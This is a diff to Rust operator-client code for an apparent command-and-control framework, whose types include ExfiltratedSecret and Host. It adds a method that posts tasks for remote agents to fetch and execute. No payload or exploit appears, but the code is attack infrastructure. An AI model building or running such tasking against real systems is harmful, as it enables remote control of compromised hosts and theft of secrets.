@@ -6,7 +6,10 @@
 use std::io::Write;
 use std::path::Path;
 
-use kx_core::c2::{ExfiltratedSecret, Host, Task, PATH_HOSTS, PATH_SECRETS, PATH_TASKS};
+use kx_core::c2::{
+    CreateTaskRequest, ExfiltratedSecret, Host, Task, PATH_HOSTS, PATH_SECRETS, PATH_TASKS,
+    PATH_TASKS_CREATE,
+};
 use serde::Deserialize;
 use thiserror::Error;
 use ureq::Agent;
@@ -75,6 +78,29 @@ impl Client {
             &format!("{}{PATH_TASKS}", self.base_url),
             &self.token,
         )
+    }
+
+    /// Legt einen Task an und liefert die ID zurueck.
+    ///
+    /// Der Agent holt den Task ueber `GET /api/tasks` ab, fuehrt ihn aus und
+    /// meldet das Ergebnis zurueck.
+    pub async fn create_task(&self, req: &CreateTaskRequest) -> Result<String, ApiError> {
+        let resp = self
+            .agent
+            .post(&format!("{}{PATH_TASKS_CREATE}", self.base_url))
+            .set("Authorization", &format!("Bearer {}", self.token))
+            .send_json(serde_json::to_value(req).map_err(|e| ApiError::Json(e.to_string()))?)
+            .map_err(|e| ApiError::Http(e.to_string()))?;
+        if resp.status() != 200 && resp.status() != 201 {
+            let status = resp.status();
+            let body = resp.into_string().unwrap_or_else(|_| "<binaer>".into());
+            return Err(ApiError::Http(format!("Status {status}: {body}")));
+        }
+        let body = resp
+            .into_string()
+            .map_err(|e| ApiError::Http(e.to_string()))?;
+        let task: Task = serde_json::from_str(&body).map_err(|e| ApiError::Json(e.to_string()))?;
+        Ok(task.id)
     }
 }
 
